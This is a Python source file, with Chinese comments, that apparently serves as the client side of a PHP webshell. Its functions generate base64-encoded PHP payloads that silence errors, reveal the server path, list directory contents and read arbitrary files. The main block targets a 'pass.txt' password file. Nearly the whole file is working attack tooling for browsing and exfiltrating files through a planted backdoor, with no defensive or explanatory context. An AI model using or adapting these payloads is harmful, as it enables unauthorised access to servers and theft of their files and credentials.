import base64


def getFilePathBase():
    """
    获取请求url文件的文件路径
    :return: php->base64 code
    """
    code = """
    @ini_set("display_errors","0");
	@set_time_limit(0);
	@set_magic_quotes_runtime(0);
    header("Content-Type:application/json");
    $res = array();$res["path"] = dirname(__FILE__);
    echo ("<ek>");
    echo json_encode($res);
    echo ("</ek>");
    """
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")



def getFilelistBase(path):
    """
    获取该路径下所有文件信息
    :param path: 文件路径
    :return: PHP->base64 code
    """
    code = """
    header("Content-Type:application/json");
    @ini_set("display_errors","0");
	@set_time_limit(0);
	@set_magic_quotes_runtime(0);
    function getfile($path){
        $i=0;
        $res = array();
        if($handler = opendir($path)){
            while (($file = readdir($handler)) !==false){
                $f = array();
                $f["name"] = $file;
                $f['type'] = filetype($path ."/". $file);
                $f['time'] = date("Y-m-d H:i:s", filemtime($path ."/". $file));
                $f['size'] = filesize($path ."/". $file);
                $res[$i] = $f;
                $i++;
            }
            closedir($handler);
        }
        echo ("<ek>");
        echo json_encode($res);
        echo ("</ek>");
    }
    getfile("%s");
    """% path

    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def getFile(path):
    """
    指定一个文件的路径，放回该文件的信息。
    :param path: 文件路径
    :return: PHP-> base64  code
    """
    code = """
    @ini_set("display_errors","0");
	@set_time_limit(0);
	@set_magic_quotes_runtime(0);
    $path = '%s';
    $hanlder = fopen($path, 'rb');
    $res = fread($hanlder, filesize($path));
    fclose($hanlder);
    echo $res;
    """% path
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


if __name__ == '__main__':
    print(getFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
